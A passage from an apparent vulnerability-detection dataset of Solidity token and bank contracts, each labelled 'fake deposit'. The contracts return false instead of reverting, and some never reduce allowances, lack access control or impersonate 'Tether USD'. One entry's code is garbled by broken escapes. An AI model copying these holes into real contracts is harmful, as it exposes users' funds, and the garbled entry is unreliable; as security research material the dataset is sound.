        "Code": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.6.7;\r\n\r\n\r\ninterface ERC20 {\r\n    function totalSupply() external view returns (uint _totalSupply);\r\n    function balanceOf(address _owner) external view returns (uint balance);\r\n    function transfer(address _to, uint _value) external returns (bool success);\r\n    function transferFrom(address _from, address _to, uint _value) external returns (bool success);\r\n    function approve(address _spender, uint _value) external returns (bool success);\r\n    function allowance(address _owner, address _spender) external view returns (uint remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n\r\n}\r\n\r\n// this is the basics of creating an ERC20 token\r\n//change the name Henri and the symbol to whatever you would like\r\n\r\ncontract Loeker is ERC20 {\r\n    string public constant symbol = \"USDT\";\r\n    string public constant name = \"Tether USD\";\r\n    uint8 public constant decimals = 10;\r\n \r\n    //1,000,000+10 zeros\r\n    uint private constant __totalSupply = 10000000000000000000000000;\r\n\r\n    //this mapping is where we store the balances of an address\r\n    mapping (address => uint) private __balanceOf;\r\n\r\n    //This is a mapping of a mapping.  This is for the approval function to determine how much an address can spend\r\n    mapping (address => mapping (address => uint)) private __allowances;\r\n\r\n    //the creator of the contract has the total supply and no one can create tokens\r\n    constructor() public {\r\n        __balanceOf[msg.sender] = __totalSupply;\r\n    }\r\n\r\n    //constant value that does not change/  returns the amount of initial tokens to display\r\n    function totalSupply() public view override returns (uint _totalSupply) {\r\n        _totalSupply = __totalSupply;\r\n    }\r\n\r\n    //returns the balance of a specific address\r\n    function balanceOf(address _addr) public view override returns (uint balance) {\r\n        return __balanceOf[_addr];\r\n    }\r\n    \r\n\r\n    //transfer an amount of tokens to another address.  The transfer needs to be >0 \r\n    //does the msg.sender have enough tokens to forfill the transfer\r\n    //decrease the balance of the sender and increase the balance of the to address\r\n    function transfer(address _to, uint _value) public override returns (bool success) {\r\n        if (_value > 0 && _value <= balanceOf(msg.sender)) {\r\n            __balanceOf[msg.sender] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    \r\n    //this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\r\n    //If the 3rd party has an allowance of >0 \r\n    //and the value to transfer is >0 \r\n    //and the allowance is >= the value of the transfer\r\n    //and it is not a contract\r\n    //perform the transfer by increasing the to account and decreasing the from accounts\r\n    function transferFrom(address _from, address _to, uint _value) public override returns (bool success) {\r\n        if (__allowances[_from][msg.sender] > 0 &&\r\n            _value >0 &&\r\n            __allowances[_from][msg.sender] >= _value\r\n            //  the to address is not a contract\r\n            && !isContract(_to)) {\r\n            __balanceOf[_from] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n\r\n    //This check is to determine if we are sending to a contract?\r\n    //Is there code at this address?  If the code size is greater then 0 then it is a contract.\r\n    function isContract(address _addr) public view returns (bool) {\r\n        uint codeSize;\r\n        //in line assembly code\r\n        assembly {\r\n            codeSize := extcodesize(_addr)\r\n        }\r\n        // i=s code size > 0  then true\r\n        return codeSize > 0;    \r\n    }\r\n\r\n \r\n    //allows a spender address to spend a specific amount of value\r\n    function approve(address _spender, uint _value) external override returns (bool success) {\r\n        __allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    //shows how much a spender has the approval to spend to a specific address\r\n    function allowance(address _owner, address _spender) external override view returns (uint remaining) {\r\n        return __allowances[_owner][_spender];\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: GPL-3.0\r\n\r\npragma solidity ^0.6.7;\r\n\r\n\r\ninterface ERC20 {\r\n    function totalSupply() external view returns (uint _totalSupply);\r\n    function balanceOf(address _owner) external view returns (uint balance);\r\n    function transfer(address _to, uint _value) external returns (bool success);\r\n    function transferFrom(address _from, address _to, uint _value) external returns (bool success);\r\n    function approve(address _spender, uint _value) external returns (bool success);\r\n    function allowance(address _owner, address _spender) external view returns (uint remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n\r\n}\r\n\r\n// this is the basics of creating an ERC20 token\r\n//change the name Henri and the symbol to whatever you would like\r\n\r\ncontract Loeker is ERC20 {\r\n    string public constant symbol = \"MYN\";\r\n    string public constant name = \"Myron\";\r\n    uint8 public constant decimals = 6;\r\n \r\n    //1,000,000+18 zeros\r\n    uint private constant __totalSupply = 1000000000000;\r\n\r\n    //this mapping is where we store the balances of an address\r\n    mapping (address => uint) private __balanceOf;\r\n\r\n    //This is a mapping of a mapping.  This is for the approval function to determine how much an address can spend\r\n    mapping (address => mapping (address => uint)) private __allowances;\r\n\r\n    //the creator of the contract has the total supply and no one can create tokens\r\n    constructor() public {\r\n        __balanceOf[msg.sender] = __totalSupply;\r\n    }\r\n\r\n    //constant value that does not change/  returns the amount of initial tokens to display\r\n    function totalSupply() public view override returns (uint _totalSupply) {\r\n        _totalSupply = __totalSupply;\r\n    }\r\n\r\n    //returns the balance of a specific address\r\n    function balanceOf(address _addr) public view override returns (uint balance) {\r\n        return __balanceOf[_addr];\r\n    }\r\n    \r\n\r\n    //transfer an amount of tokens to another address.  The transfer needs to be >0 \r\n    //does the msg.sender have enough tokens to forfill the transfer\r\n    //decrease the balance of the sender and increase the balance of the to address\r\n    function transfer(address _to, uint _value) public override returns (bool success) {\r\n        if (_value > 0 && _value <= balanceOf(msg.sender)) {\r\n            __balanceOf[msg.sender] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    \r\n    //this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\r\n    //If the 3rd party has an allowance of >0 \r\n    //and the value to transfer is >0 \r\n    //and the allowance is >= the value of the transfer\r\n    //and it is not a contract\r\n    //perform the transfer by increasing the to account and decreasing the from accounts\r\n    function transferFrom(address _from, address _to, uint _value) public override returns (bool success) {\r\n        if (__allowances[_from][msg.sender] > 0 &&\r\n            _value >0 &&\r\n            __allowances[_from][msg.sender] >= _value\r\n            //  the to address is not a contract\r\n            && !isContract(_to)) {\r\n            __balanceOf[_from] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n\r\n    //This check is to determine if we are sending to a contract?\r\n    //Is there code at this address?  If the code size is greater then 0 then it is a contract.\r\n    function isContract(address _addr) public view returns (bool) {\r\n        uint codeSize;\r\n        //in line assembly code\r\n        assembly {\r\n            codeSize := extcodesize(_addr)\r\n        }\r\n        // i=s code size > 0  then true\r\n        return codeSize > 0;    \r\n    }\r\n\r\n \r\n    //allows a spender address to spend a specific amount of value\r\n    function approve(address _spender, uint _value) external override returns (bool success) {\r\n        __allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    //shows how much a spender has the approval to spend to a specific address\r\n    function allowance(address _owner, address _spender) external override view returns (uint remaining) {\r\n        return __allowances[_owner][_spender];\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.21 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Hexaputon is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Hexaputon\";\r\n    string public constant symbol = \"HEXA\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.4.20;\r\n\r\ncontract Token {\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) public constant returns (uint balance);\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint _value) public returns (bool success);\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint _value) public returns (bool success);\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint _value) public returns (bool success);\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) public constant returns (uint remaining);\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n}\r\n\r\ncontract RegularToken is Token {\r\n    uint constant private MAX_UINT = 2**256 - 1;\r\n\r\n    mapping (address => uint) balances;\r\n    mapping (address => mapping (address => uint)) allowed;\r\n\r\n    function transfer(address _to, uint _value) public returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint _value) public returns (bool success)\r\n    {\r\n        uint allowance = allowed[_from][msg.sender];\r\n        if (balances[_from] >= _value\r\n            && allowance >= _value\r\n            && balances[_to] + _value >= balances[_to]\r\n        ) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            if (allowance < MAX_UINT) {\r\n                allowed[_from][msg.sender] -= _value;\r\n            }\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address _owner) public constant returns (uint balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint _value) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n}\r\n\r\ncontract IOSToken is RegularToken {\r\n\r\n    uint constant public totalSupply = 90*10**27;\r\n    uint8 constant public decimals = 18;\r\n    string constant public name = \"Wrapped IOST\";\r\n    string constant public symbol = \"IOST\";\r\n\r\n    function IOSToken() public {\r\n        balances[msg.sender] = totalSupply;\r\n        Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.11;\r\n \r\n\r\ncontract IMigrationContract {\r\n    function migrate(address addr, uint256 nas) returns (bool success);\r\n}\r\n\r\n\r\ncontract SafeMath {\r\n    function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\r\n        uint256 z = x + y;\r\n        assert((z >= x) && (z >= y));\r\n        return z;\r\n    }\r\n \r\n    function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\r\n        assert(x >= y);\r\n        uint256 z = x - y;\r\n        return z;\r\n    }\r\n \r\n    function safeMult(uint256 x, uint256 y) internal returns(uint256) {\r\n        uint256 z = x * y;\r\n        assert((x == 0)||(z/x == y));\r\n        return z;\r\n    }\r\n \r\n}\r\n \r\n\r\ncontract Token {\r\n    uint256 public totalSupply; //\u4ee3\u5e01\u603b\u91cf\r\n    function balanceOf(address _owner) constant returns (uint256 balance);\r\n    function transfer(address _to, uint256 _value) returns (bool success);\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\n    function approve(address _spender, uint256 _value) returns (bool success);\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\ncontract StandardToken is Token {\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n \r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n \r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n \r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n \r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n}\r\n \r\n\r\n//JGO\u4ee3\u5e01\u5408\u7ea6\r\ncontract JGOToken is StandardToken, SafeMath {\r\n    string  public constant name     = \"laeerg\";   //\u540d\u79f0\r\n    string  public constant symbol   = \"LAR\";   //\u7b26\u53f7\r\n    uint256 public constant decimals = 9;      //\u5c0f\u6570\u4f4d\r\n    string  public           version = \"1.0\";   //\u7248\u672c\r\n \r\n    address public ethFundDeposit;              //ETH\u5b58\u653e\u5730\u5740\r\n    uint256 public currentSupply;               //\u4ee3\u5e01\u4f9b\u5e94\u91cf\r\n\r\n \r\n    modifier isOwner()  { require(msg.sender == ethFundDeposit); _; }\r\n\r\n    function formatDecimals(uint256 _value) internal returns (uint256 ) {\r\n        return _value * 10 ** decimals;\r\n    }\r\n\r\n \r\n    //JGO\u5408\u7ea6\u521d\u59cb\u5316\u51fd\u6570(\u5408\u7ea6\u6240\u6709\u4eba\u5730\u5740, \u5f53\u524d\u4f9b\u5e94\u91cf, \u4ee3\u5e01\u603b\u91cf)\r\n    function JGOToken(address _ethFundDeposit, uint256 _totalSupply) {\r\n        ethFundDeposit = _ethFundDeposit;\r\n                      \r\n        currentSupply = formatDecimals(_totalSupply); //\u5f53\u524d\u4f9b\u5e94\u91cf\r\n        totalSupply = formatDecimals(_totalSupply);     //\u4ee3\u5e01\u603b\u91cf\r\n        balances[msg.sender] = totalSupply;\r\n        if(currentSupply > totalSupply) throw;\r\n    }\r\n    \r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.6.8;\r\n\r\n\r\ninterface ERC20 {\r\n    function totalSupply() external view returns (uint _totalSupply);\r\n    function balanceOf(address _owner) external view returns (uint balance);\r\n    function transfer(address _to, uint _value) external returns (bool success);\r\n    function transferFrom(address _from, address _to, uint _value) external returns (bool success);\r\n    function approve(address _spender, uint _value) external returns (bool success);\r\n    function allowance(address _owner, address _spender) external view returns (uint remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n\r\n}\r\n\r\n// this is the basics of creating an ERC20 token\r\n//change the name Henri and the symbol to whatever you would like\r\n\r\ncontract Loeker is ERC20 {\r\n    string public constant symbol = \"USDT\";\r\n    string public constant name = \"Tether USD\";\r\n    uint8 public constant decimals = 10;\r\n \r\n    //1,000,000+10 zeros\r\n    uint private constant __totalSupply = 10000000000000000000000000;\r\n\r\n    //this mapping is where we store the balances of an address\r\n    mapping (address => uint) private __balanceOf;\r\n\r\n    //This is a mapping of a mapping.  This is for the approval function to determine how much an address can spend\r\n    mapping (address => mapping (address => uint)) private __allowances;\r\n\r\n    //the creator of the contract has the total supply and no one can create tokens\r\n    constructor() public {\r\n        __balanceOf[msg.sender] = __totalSupply;\r\n    }\r\n\r\n    //constant value that does not change/  returns the amount of initial tokens to display\r\n    function totalSupply() public view override returns (uint _totalSupply) {\r\n        _totalSupply = __totalSupply;\r\n    }\r\n\r\n    //returns the balance of a specific address\r\n    function balanceOf(address _addr) public view override returns (uint balance) {\r\n        return __balanceOf[_addr];\r\n    }\r\n    \r\n\r\n    //transfer an amount of tokens to another address.  The transfer needs to be >0 \r\n    //does the msg.sender have enough tokens to forfill the transfer\r\n    //decrease the balance of the sender and increase the balance of the to address\r\n    function transfer(address _to, uint _value) public override returns (bool success) {\r\n        if (_value > 0 && _value <= balanceOf(msg.sender)) {\r\n            __balanceOf[msg.sender] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    \r\n    //this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\r\n    //If the 3rd party has an allowance of >0 \r\n    //and the value to transfer is >0 \r\n    //and the allowance is >= the value of the transfer\r\n    //and it is not a contract\r\n    //perform the transfer by increasing the to account and decreasing the from accounts\r\n    function transferFrom(address _from, address _to, uint _value) public override returns (bool success) {\r\n        if (__allowances[_from][msg.sender] > 0 &&\r\n            _value >0 &&\r\n            __allowances[_from][msg.sender] >= _value\r\n            //  the to address is not a contract\r\n            && !isContract(_to)) {\r\n            __balanceOf[_from] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n\r\n    //This check is to determine if we are sending to a contract?\r\n    //Is there code at this address?  If the code size is greater then 0 then it is a contract.\r\n    function isContract(address _addr) public view returns (bool) {\r\n        uint codeSize;\r\n        //in line assembly code\r\n        assembly {\r\n            codeSize := extcodesize(_addr)\r\n        }\r\n        // i=s code size > 0  then true\r\n        return codeSize > 0;    \r\n    }\r\n\r\n \r\n    //allows a spender address to spend a specific amount of value\r\n    function approve(address _spender, uint _value) external override returns (bool success) {\r\n        __allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    //shows how much a spender has the approval to spend to a specific address\r\n    function allowance(address _owner, address _spender) external override view returns (uint remaining) {\r\n        return __allowances[_owner][_spender];\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: GPL-4.0\r\n\r\npragma solidity ^0.6.7;\r\n\r\n\r\ninterface ERC20 {\r\n    function totalSupply() external view returns (uint _totalSupply);\r\n    function balanceOf(address _owner) external view returns (uint balance);\r\n    function transfer(address _to, uint _value) external returns (bool success);\r\n    function transferFrom(address _from, address _to, uint _value) external returns (bool success);\r\n    function approve(address _spender, uint _value) external returns (bool success);\r\n    function allowance(address _owner, address _spender) external view returns (uint remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n\r\n}\r\n\r\n// this is the basics of creating an ERC20 token\r\n//change the name Henri and the symbol to whatever you would like\r\n\r\ncontract Loeker is ERC20 {\r\n    string public constant symbol = \"MYN\";\r\n    string public constant name = \"Myron\";\r\n    uint8 public constant decimals = 6;\r\n \r\n    //1,000,000+18 zeros\r\n    uint private constant __totalSupply = 1000000000000;\r\n\r\n    //this mapping is where we store the balances of an address\r\n    mapping (address => uint) private __balanceOf;\r\n\r\n    //This is a mapping of a mapping.  This is for the approval function to determine how much an address can spend\r\n    mapping (address => mapping (address => uint)) private __allowances;\r\n\r\n    //the creator of the contract has the total supply and no one can create tokens\r\n    constructor() public {\r\n        __balanceOf[msg.sender] = __totalSupply;\r\n    }\r\n\r\n    //constant value that does not change/  returns the amount of initial tokens to display\r\n    function totalSupply() public view override returns (uint _totalSupply) {\r\n        _totalSupply = __totalSupply;\r\n    }\r\n\r\n    //returns the balance of a specific address\r\n    function balanceOf(address _addr) public view override returns (uint balance) {\r\n        return __balanceOf[_addr];\r\n    }\r\n    \r\n\r\n    //transfer an amount of tokens to another address.  The transfer needs to be >0 \r\n    //does the msg.sender have enough tokens to forfill the transfer\r\n    //decrease the balance of the sender and increase the balance of the to address\r\n    function transfer(address _to, uint _value) public override returns (bool success) {\r\n        if (_value > 0 && _value <= balanceOf(msg.sender)) {\r\n            __balanceOf[msg.sender] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    \r\n    //this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\r\n    //If the 3rd party has an allowance of >0 \r\n    //and the value to transfer is >0 \r\n    //and the allowance is >= the value of the transfer\r\n    //and it is not a contract\r\n    //perform the transfer by increasing the to account and decreasing the from accounts\r\n    function transferFrom(address _from, address _to, uint _value) public override returns (bool success) {\r\n        if (__allowances[_from][msg.sender] > 0 &&\r\n            _value >0 &&\r\n            __allowances[_from][msg.sender] >= _value\r\n            //  the to address is not a contract\r\n            && !isContract(_to)) {\r\n            __balanceOf[_from] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n\r\n    //This check is to determine if we are sending to a contract?\r\n    //Is there code at this address?  If the code size is greater then 0 then it is a contract.\r\n    function isContract(address _addr) public view returns (bool) {\r\n        uint codeSize;\r\n        //in line assembly code\r\n        assembly {\r\n            codeSize := extcodesize(_addr)\r\n        }\r\n        // i=s code size > 0  then true\r\n        return codeSize > 0;    \r\n    }\r\n\r\n \r\n    //allows a spender address to spend a specific amount of value\r\n    function approve(address _spender, uint _value) external override returns (bool success) {\r\n        __allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    //shows how much a spender has the approval to spend to a specific address\r\n    function allowance(address _owner, address _spender) external override view returns (uint remaining) {\r\n        return __allowances[_owner][_spender];\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "{\"MetaSigma.sol\":{\"content\":\"SPDX-License-Identifier: u003cSPDX Licenseu003e\n Compatible with version\n of compiler upto 0.6.6\npragma solidity ^0.6.6;\n\n Creating a Contract\ncontract MetaSigma\n{\n\nmapping(address =u003e uint256) balances;\nmapping(address =u003e mapping (\naddress =u003e uint256)) allowed;\n\nuint256 _totalSupply = 122800000;\n\naddress public owner;\n\nevent Approval(address indexed _owner,\naddress indexed _spender,\nuint256 _value);\n\nevent Transfer(address indexed _from,\ntaddress indexed _to,\ntuint256 _value);\n\n totalSupply function\nfunction totalSupply()\npublic view returns (\nuint256 theTotalSupply)\n{\ntheTotalSupply = _totalSupply;\nreturn theTotalSupply;\n}\n\n balanceOf function\nfunction balanceOf(address _owner)\npublic view returns (\nuint256 balance)\n{\nreturn balances[_owner];\n}\n\n function approve\nfunction approve(address _spender,\nuint256 _amount)\npublic returns (bool success)\n{\nt If the address is allowed\nt to spend from this contract\nallowed[msg.sender][_spender] = _amount;\nt\n Fire the event \"Approval\"\n to execute any logic that\n was listening to it\nemit Approval(msg.sender,\n_spender, _amount);\nreturn true;\n}\n\n transfer function\nfunction transfer(address _to,\nuint256 _amount)\npublic returns (bool success)\n{\n transfers the value if\n balance of sender is\n greater than the amount\nif (balances[msg.sender] u003e= _amount)\n{\ntbalances[msg.sender] -= _amount;\nbalances[_to] += _amount;\n\n Fire a transfer event for\n any logic that is listening\nemit Transfer(msg.sender,\nt_to, _amount);\ntreturn true;\n}\nelse\n{\nreturn false;\n}\n}\n\n\nfunction transferFrom(address _from,\ntaddress _to,\ntuint256 _amount)\ntpublic returns (bool success)\n{\nif (balances[_from] u003e= _amount u0026u0026\ntallowed[_from][msg.sender] u003e=\nt_amount u0026u0026 _amount u003e 0 u0026u0026\ntbalances[_to] + _amount u003e balances[_to])\n{\nbalances[_from] -= _amount;\nbalances[_to] += _amount;\n\n Fire a Transfer event for\n any logic that is listening\nemit Transfer(_from, _to, _amount);\ntreturn true;\n\n}\nelse\n{\ntreturn false;\n}\n}\n\n Check if address is allowed\n to spend on the owneru0027s behalf\nfunction allowance(address _owner,\naddress _spender)\npublic view returns (uint256 remaining)\n{\nreturn allowed[_owner][_spender];\n}\n}\n\"},\"MTASigma.sol\":{\"content\":\"SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.6.6;\n\ncontract MTASBankContract {\n    \n    struct client_account{\n        int client_id;\n        address client_address;\n        uint client_balance_in_ether;\n    }\n    \n    client_account[] clients;\n    \n    int clientCounter; \n    address payable manager;\n    mapping(address =u003e uint) public interestDate;\n    \n    modifier onlyManager() {\n        require(msg.sender == manager, \"Only manager can call this!\");\n        _;\n    }\n    \n    modifier onlyClients() {\n        bool isclient = false;\n        for(uint i=0;iu003cclients.length;i++){\n            if(clients[i].client_address == msg.sender){\n                isclient = true;\n                break;\n            }\n        }\n        require(isclient, \"Only clients can call this!\");\n        _;\n    }\n    \n    constructor() public{\n        clientCounter = 0;\n    }\n    \n    receive() external payable { }\n    \n    function setManager(address managerAddress) public returns(string memory){\n        manager = payable(managerAddress);\n        return \"\";\n    }\n   \n    function joinAsClient() public payable returns(string memory){\n        interestDate[msg.sender] = now;\n        clients.push(client_account(clientCounter++, msg.sender, address(msg.sender).balance));\n        return \"\";\n    }\n    \n    function deposit() public payable onlyClients{\n        payable(address(this)).transfer(msg.value);\n    }\n    \n    function withdraw(uint amount) public payable onlyClients{\n        msg.sender.transfer(amount * 1 ether);\n    }\n    \n    function sendInterest() public payable onlyManager{\n        for(uint i=0;iu003cclients.length;i++){\n            address initialAddress = clients[i].client_address;\n            uint lastInterestDate = interestDate[initialAddress];\n            if(now u003c lastInterestDate + 10 seconds){\n                revert(\"Itu0027s just been less than 10 seconds!\");\n            }\n            payable(initialAddress).transfer(1 ether);\n            interestDate[initialAddress] = now;\n        }\n    }\n    \n    function getContractBalance() public view returns(uint){\n        return address(this).balance;\n    }\n}\"}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
